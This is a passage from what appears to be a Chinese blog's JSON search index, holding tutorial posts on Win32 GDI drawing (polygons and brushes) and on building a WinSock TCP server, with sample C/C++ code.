APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; POINT pt[4] = &#123; &#123;200,200&#125;, &#123;500,200&#125;, &#123;500,500&#125;, &#123;200,500&#125; &#125;; POINT pt2[8] = &#123; &#123; 200,200 &#125;, &#123; 500,200 &#125;, &#123; 500,500 &#125;, &#123; 200,500 &#125;, &#123;600,200&#125;, &#123;1000,200&#125;, &#123;1000,500&#125;, &#123;600,500&#125; &#125;; //多个多边形的顶点数 int pn[2] = &#123; 4,4 &#125;; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //多边形函数 //连接点,最后一个点会自动连接到第一个点 //Polygon(hdc,pt,4); PolyPolygon( hdc, //句柄 pt2, //多边形顶点数组 pn, //存储的是多边形顶点的个数,比如第一个多边形的顶点是4,第二个也是4 2 //多边形个数 ); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"画刷","slug":"pwcp016-画刷","date":"2021-06-12T16:25:11.000Z","updated":"2021-06-12T17:03:49.629Z","comments":true,"path":"2021/06/13/pwcp016-画刷/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/13/pwcp016-画刷/","excerpt":"","text":"画刷 备用画刷（stock brush） ​ 1.WHITE_BRUSH 白色画刷 LTGRAY_BRUSH 浅灰色画刷 3.GRAY_BRUSH 灰色画刷 4.DKGRAY_BRUSH 深灰色画刷 BLACK_BRUSH 黑色画刷 NULL_BRUSH 空画刷 创建颜色画刷 1HBRUSH CreateSolidBrush(COLORREF crColor); 1CreateSolidBrush(RGB(255,100,200)); 创建阴影画刷 1HBRUSH CreateHatchBrush(int fnStyle, COLORREF clrref)； fnStyle：指定刷子的阴影样式。该参数可以取下列值，这些值的含义为： HS_BDIAGONAL：表示45度向上，从左至右的阴影(/////)； HS_CROSS：水平和垂直交叉阴影(+++++)； HS_DIAGCROSS：45度交叉阴影(XXXXX)； HS_FDIAGONAL：45度向下，自左至右阴影(\\\\\\)； HS_HORIZONTAL：水平阴影(-----)； HS_VERTICAL：垂直阴影(|||||)。 cirref：指定用于阴影的刷子的前景色。 返回值：如果函数执行成功，那么返回值标识为逻辑刷子；如果函数执行失败，那么返回值为NULL。 1CreateHatchBrush(HS_VERTICAL, RGB(2, 202, 33)); HBRUSH类型 画刷句柄类型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// 画刷.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画刷.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HBRUSH hBrush; HDC hdc = BeginPaint(hWnd, &amp;ps); SelectObject(hdc,CreatePen(PS_SOLID,5,RGB(255,0,0))); SelectObject(hdc, GetStockObject(GRAY_BRUSH)); Rectangle(hdc,100,100,200,200); hBrush = (HBRUSH)CreateHatchBrush(HS_HORIZONTAL, RGB(2, 202, 33)); SelectObject(hdc, hBrush); Rectangle(hdc, 250, 100, 350, 200); DeleteObject(SelectObject(hdc, CreateSolidBrush(RGB(255,100,200)))); Rectangle(hdc, 400, 100, 500, 200); DeleteObject(SelectObject(hdc, CreateHatchBrush(HS_BDIAGONAL, RGB(2, 202, 33)))); Rectangle(hdc, 550, 100, 650, 200); DeleteObject(SelectObject(hdc, CreateHatchBrush(HS_VERTICAL, RGB(2, 202, 33)))); Rectangle(hdc, 700, 100, 800, 200); DeleteObject(SelectObject(hdc, GetStockObject(WHITE_BRUSH))); DeleteObject(SelectObject(hdc, GetStockObject(WHITE_PEN))); // TODO: 在此处添加使用 hdc 的任何绘图代码... EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"CS模型的TCP/IP协议","slug":"WS002CS模型的TCP-IP协议","date":"2021-06-08T14:48:18.000Z","updated":"2021-06-11T13:33:42.761Z","comments":true,"path":"2021/06/08/WS002CS模型的TCP-IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/08/WS002CS模型的TCP-IP协议/","excerpt":"","text":"CS模型的TCP/IP协议 创建服务端步骤 打开网络头文件 启动网络库 校验版本 创建SOCKET 绑定地址与端口 开始监听 接受连接 与客户端收发消息 网络头文件 网络库 12#include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 目前网络库有哪些版本: 1.0 1.1 2.0 2.1 2.2 WSADATA结构 1234567891011121314151617typedef struct WSAData &#123; WORD wVersion; WORD wHighVersion;#ifdef _WIN64 unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR * lpVendorInfo; char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1];#else char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1]; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR * lpVendorInfo;#endif&#125; WSADATA; wVersion Windows Sockets DLL期望调用者使用的Windows Sockets规范的版本。 高位字节存储副版本号, 低位字节存储主版本号，可以用WORD MAKEWORD(BYTE,BYTE ) 返回这个值,例如:MAKEWORD(1,1) wHighVersion 这个DLL能够支持的Windows Sockets规范的最高版本。通常它与wVersion相同。 szDescription 以null结尾的ASCII字符串，Windows Sockets DLL将对Windows Sockets实现的描述拷贝到这个字符串中，包括制造商标识。文本（最多可以有256个字符）可以包含任何字符，但是要注意不能包含控制字符和格式字符，应用程序对其最可能的使用方式是把它（可能被截断）显示在在状态信息中。 szSystemStatus 以null结尾的ASCII字符串，Windows Sockets DLL把有关的状态或配置信息拷贝到该字符串中。Windows Sockets DLL应当仅在这些信息对用户或支持人员有用时才使用它们，它不应被作为szDescription域的扩展。 iMaxSockets 单个进程能够打开的socket的最大数目。Windows Sockets的实现能提供一个全局的socket池，可以为任何进程分配；或者它也可以为socket分配属于进程的资源。这个数字能够很好地反映Windows Sockets DLL或网络软件的配置方式。应用程序的编写者可以通过这个数字来粗略地指明Windows Sockets的实现方式对应用程序是否有用。例如，X Windows服务器在第一次启动的时候可能会检查iMaxSockets的值：如果这个值小于8，应用程序将显示一条错误信息，指示用户重新配置网络软件（这是一种可能要使用szSystemStatus文本的场合）。显然无法保证某个应用程序能够真正分配iMaxSockets个socket，因为可能有其它WindowsSockets应用程序正在使用。 iMaxUdpDg Windows Sockets应用程序能够发送或接收的最大的用户数据包协议（UDP）的数据包大小，以字节为单位。如果实现方式没有限制，那么iMaxUdpDg为零。在Berkeley sockets的许多实现中，对于UDP数据包有个固有的限制（在必要时被分解），大小为8192字节。Windows Sockets的实现可以对碎片重组缓冲区的分配作出限制。对于适合的WindowsSockets 实现，iMaxUdpDg的最小值为512。注意不管iMaxUdpDg的值是什么，都不推荐你发回一个比网络的最大传送单元（MTU）还大的广播数据包。（Windows Sockets API 没有提供发现MTU的机制，但是它不会小于512个字节)。WinSock2.0版中已被废弃。 lpVendorInfo 指向销售商的数据结构的指针。这个结构的定义（如果有）超出了WindowsSockets规范的范围。WinSock2.0版中已被废弃。 WSAStartup打开网络库 1234int WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData); ⑴ wVersionRequested：一个WORD（双字节）型数值，在最高版本的Windows Sockets支持调用者使用，高阶字节指定小版本(修订本)号,低位字节指定主版本号。 ⑵lpWSAData 指向WSADATA数据结构的指针，用来接收Windows Sockets [1] 实现的细节。 WindowsSockets API提供的调用方可使用的最高版本号。高位字节指出副版本(修正)号，低位字节指明主版本号。 返回值: 0 成功。 否则返回下列的错误代码之一。注意通常依靠应用程序调用WSAGetLastError()机制获得的错误代码是不能使用的，因为Windows Sockets DLL可能没有建立“上一错误”信息储存的客户数据区域。 错误代码: WSASYSNOTREADY 代码数值为10091，指出网络通信依赖的网络子系统还没有准备好。 WSAVERNOTSUPPORTED 代码数值为10092，表示所需的Windows Sockets API的版本未由特定的Windows Sockets实现提供。 WSAEINVAL 代码数值为10022，说明应用程序指出的Windows Sockets版本不被该DLL支持。 WSAEINPROGRESS 代码数值为10036，说明一个阻塞的Winsock调用正在进行中。 WSAEPROCLIM 代码数值为10067，说明已经达到了Windows Sockets实现所支持的任务数量的极限。 WSAEFAULT 代码数值为10014，说明lpWSADATA参数是一个无效的指针。 1234567891011//MAKEWORD(主版本,副版本) 负责将2,2分配到wdVerSion低8位和高8位//wdVerSion低8位存储主版本,高8位存储副版本WORD wdVerSion = MAKEWORD(2, 2);WSADATA wdSockMsg;int nRes = WSAStartup(wdVerSion, &amp;wdSockMsg);if (0 != nRes)&#123; printf(&quot;WSAStartup Error %d\\n&quot;,nRes);&#125; 校验版本 12345678//校验网络库版本//HIBYTE取高8位,LOBYTE取高8位if (HIBYTE(wdSockMsg.wVersion) != 2 || LOBYTE(wdSockMsg.wVersion) != 2)&#123; //关闭网络库 WSACleanup(); return 0;&#125; 创建SOCKET套接字 1SOCKET PASCAL FAR socket( int af, int type, int protocol); 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626xx 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 12345678SOCKET sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);//如果创建套接字失败if (INVALID_SOCKET == sock)&#123; printf(\"socket Error: %d\\n\",WSAGetLastError()); //关闭网络库 WSACleanup();&#125; 绑定地址与端口 给我们的socket绑定端口号与具体地址 1int PASCAL FAR bind( SOCKET sockaddr, const struct sockaddr FAR* my_addr,int addrlen); 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 12345sockaddr_in sockAddress;sockAddress.sin_family = AF_INET; //地址类型sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //服务器ip地址sockAddress.sin_port = 12345; //服务器端口号(sockaddr*)&amp;sockAddress强转添加到参数2上 参数3 参数2的类型大小 sizeof(sockAddress) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); htons htons的功能：将一个无符号短整型的主机数值转换为网络字节顺序，即大尾顺序(big-endian) 1u_short htons(u_short hostshort); 而我们常用的 x86 CPU (intel, AMD) 电脑是 little-endian,也就是整数的低位字节放在内存的低字节处。举个例子吧。假定你的数据是0x1234, 在网络字节顺序里 这个数据放到内存中就应该显示成 addr addr+1 0x12 0x34 而在x86电脑上，数据0x1234放到内存中实际是： addr addr+1 0x34 0x12 htons 的用处就是把实际主机内存中的整数存放方式调整成网络字节顺序。 inet_addr inet_addr是一个计算机函数，功能是将一个点分十进制的IP转换成一个长整数型数（u_long类型）等同于inet_addr()。 1in_addr_t inet_addr(const char* strptr); 1daddr.s_addr=inet_addr(&quot;192.168.1.60&quot;); inet_ntoa 功能是将网络地址转换成“.”点隔的字符串格式。 网络字节序IP转化点分十进制IP 1char *inet_ntoa (struct in_addr); 1234567891011121314151617struct sockaddr_in si; //地址类型 si.sin_family = AF_INET; //端口 si.sin_port = htons(12345); //地址 si.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); if (SOCKET_ERROR == bind(sock, (const struct sockaddr *)&amp;si, sizeof(si))) &#123; printf(&quot;bind Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); return 0; &#125; 开始监听 将套接字置于正在侦听传入连接的状态。 1234int WSAAPI listen( SOCKET s, int backlog); 参数1 ​ 服务器端的socket，也就是socket函数创建的 参数2 ​ 挂起连接队列的最大长度。 ​ 我们一般填写这个参数 ​ SOMAXCONN ​ 作用是让系统自动选择最合适的个数 ​ 不同的系统环境不一样，所以这个合适的数也都不一样 返回值 成功 ​ 返回0 失败 ​ SOCKET_ERROR ​ 具体错误码 ​ WSAGetLastError() ​ 释放 ​ closesocket(socketListen); ​ WSACleanup(); 123456789//开始监听 if (SOCKET_ERROR == listen(sock, SOMAXCONN)) &#123; printf(&quot;listen Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); return 0; &#125; 创建客户端socket/接受连接 作用 accept函数允许在套接字上进行传入连接尝试。 listen监听客户端来的链接，accept讲客户端的信息绑定到一个socket上，也就是给客户端创建一个socket,通过返回值返回给我们客户端的socket 一次只能创建一个，有几个客户端链接，就要调用几次 12345SOCKET WSAAPI accept( SOCKET s, //服务端socket sockaddr *addr, //用来接收客户端地址和端口 int *addrlen //参数2的长度); 这个函数是阻塞的 参数2,参数3可以设置为NULL,不得到客户端信息,可以调用getpeername函数得到客户端信息 返回值 成功 ​ 返回值就是给客户端包好的socket,与客户端通信就靠这个 失败 ​ 返回INVALID_SOCKET ,用WSAGetLastError()得到错误码 ​ 释放空间 ​ closesocket(socketListen); ​ WSACleanup(); 123456789101112struct sockaddr_in sockClientAddr; int len = sizeof(sockClientAddr); printf(&quot;等待连接...\\n&quot;); SOCKET sockClient = accept(sock, (struct sockaddr *)&amp;sockClientAddr,&amp;len); if (sockClient == INVALID_SOCKET) &#123; printf(&quot;accept Error: %d\\n&quot;, WSAGetLastError()); //关闭套接字 closesocket(sock); //关闭网络库 WSACleanup(); &#125; 通过getpeername函数得到客户端信息 1getpeername(newSocket, (struct sockaddr*)&amp;sockClient, &amp;nLen); getsockname函数得到本地服务器信息 1getsockname(sSocket, (sockaddr*)&amp;addr, &amp;nLen); 与客户端收发消息 recv收消息 数据的接收都是由协议本身做的，也就是socket的底层做的，系统会有一段缓冲区，存储着接收到的数据。 咱们外边调用recv的作用，就是通过socket找到这个缓冲区，并把数据复制进咱们的参数2，复制参数3个 123456int recv( SOCKET s, //客户端socket char *buf, //缓冲区 int len, //缓冲区大小 int flags //正常写0,表示读完就删除); 参数1 ​ 客户端的socket，每个客户端对应唯一的socket 参数2 ​ 客户端消息的存储空间，也就是个字符数组 ​ 这个一般1500字节 ​ 网络传输得最大单元，1500字节，也就是客户端发过来得数据，一次最大就是1500字节，这是协议规定，这个数值也是根据很多情况，总结出来得最优值 ​ 所以客户端最多一组来1500字节，咱们这头1500读一次，够够的了。 参数3 ​ 想要读取得字节个数 ​ 一般是参数2得字节数-1，把\\0字符串结尾留出来 参数4 一般填0,表示读完就删 MSG_PEEK ​ 窥视传入的数据。 数据将复制到缓冲区中，但不会从输入队列中删除。 ​ 读出来的不删除 ​ 这个东西是不建议被使用的 ​ 第一、读数据不行 ​ 第二、那就无法计数了 MSG_OOB ​ 带外数据 ​ 意义 ​ 就是传输一段数据，在外带一个额外的特殊数据 ​ 相当于小声BB ​ 实际 ​ 就不建议被使用了 ​ 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 ​ 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_WAITALL ​ 直到系统缓冲区字节数满足参数3所请求得字节数，才开始读取 返回值 成功 ​ 返回0 失败 ​ SOCKET_ERROR ​ 具体错误码 ​ WSAGetLastError() ​ 释放 ​ closesocket(socketListen); ​ WSACleanup(); send发送消息 向目标发送数据 本质 send函数将我们的数据复制黏贴进系统的协议发送缓冲区，计算机伺机发出去 最大传输单元是1500字节 123456int WSAAPI send( SOCKET s, //客户端socket const char *buf, //发送缓冲区 int len, //发送长度 int flags //一般写0); 参数1 ​ 目标的socket，每个客户端对应唯一的socket 参数2 ​ 给对方发送的字节串 ​ 这个不要超过1500字节 ​ 发送时候，协议要进行包装，加上协议信息，也叫协议头，或者叫包头，咱们在理论部分，会非常详细的介绍协议头，以及功能 ​ 这个大小不同的协议不一样，链路层14字节，ip头20字节，tcp头20字节，数据结尾还要有状态确认，加起来也几十个字节，所以实际咱们的数据位，不能写1500个，要留出来，那就1024吧，或者最多1400，就差不多了 ​ 懂这个大体原理就好 ​ ​ 当然大家这个不一定每次都是正好那么多字节，比如聊天，一句话就十个八个的汉字，别多于1400是最好的 ​ 超过1500系统咋办？ ​ 系统会分片处理 ​ 比如2000个字节 ​ 系统分成两个包 ​ 1400 + 包头 == 1500 假设包头100字节 600 + 包头 == 700 ​ 分两次发送出去 ​ 结果 ​ 1、系统要给咱们分包再打包，再发送， 客户端接收到了还得拆包，组合数据。从而增加了系统的工作，降低效率 ​ 2、有的协议，就把分片后的二包直接丢了 参数3 ​ 字节个数 ​ 1400 参数4 ​ 写0就行了 ​ 其他 ​ MSG_OOB ​ 意义同recv ​ 就不用使用了 ​ 带外数据 ​ 意义 ​ 就是传输一段数据，在外带一个额外的特殊数据 ​ 相当于小声BB ​ 实际 ​ 就不建议被使用了 ​ 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 ​ 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 ​ MSG_DONTROUTE ​ 指定数据不应受路由限制。 Windows套接字服务提供程序可以选择忽略此标志。 返回值 成功 返回写入的字节数 执行失败 返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib,\"Ws2_32.lib\")//标记BOOL g_nFlag = TRUE;int main(void)&#123; //打开网络库 WORD wdVersion = MAKEWORD(1,1); WSADATA wsaData; //int a = WSAStartup(wdVersion, &amp;wsaData); //printf(\"外%d\\n\", WSAStartup(wdVersion, &amp;wsaData)); if (0 != WSAStartup(wdVersion,&amp;wsaData)) // API &#123; printf (\"WSAStartup fail!\"); return -1; &#125; //校验版本 if (1 != HIBYTE(wsaData.wVersion) || 1 != LOBYTE(wsaData.wVersion)) &#123; printf(\"Version fail!\" ); //关闭库 WSACleanup(); return -1; &#125; //创建一个SOCKET 监听 SOCKET socketListen = socket(AF_INET,SOCK_STREAM,0); if (INVALID_SOCKET == socketListen) &#123; printf(\"socket fail!\"); //关闭库 WSACleanup(); return -1; &#125; //绑定地址 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); sockAddress.sin_port = 12345; if (SOCKET_ERROR == bind(socketListen,(struct sockaddr*)&amp;sockAddress,sizeof(sockAddress))) &#123; printf(\"bind fail!\"); //int nError = ::WSAGetLastError(); //关闭库 closesocket(socketListen); WSACleanup(); return -1; &#125; //开始监听 if (SOCKET_ERROR == listen(socketListen,2)) &#123; printf(\"listen fail!\"); //关闭库 closesocket(socketListen); WSACleanup(); return -1; 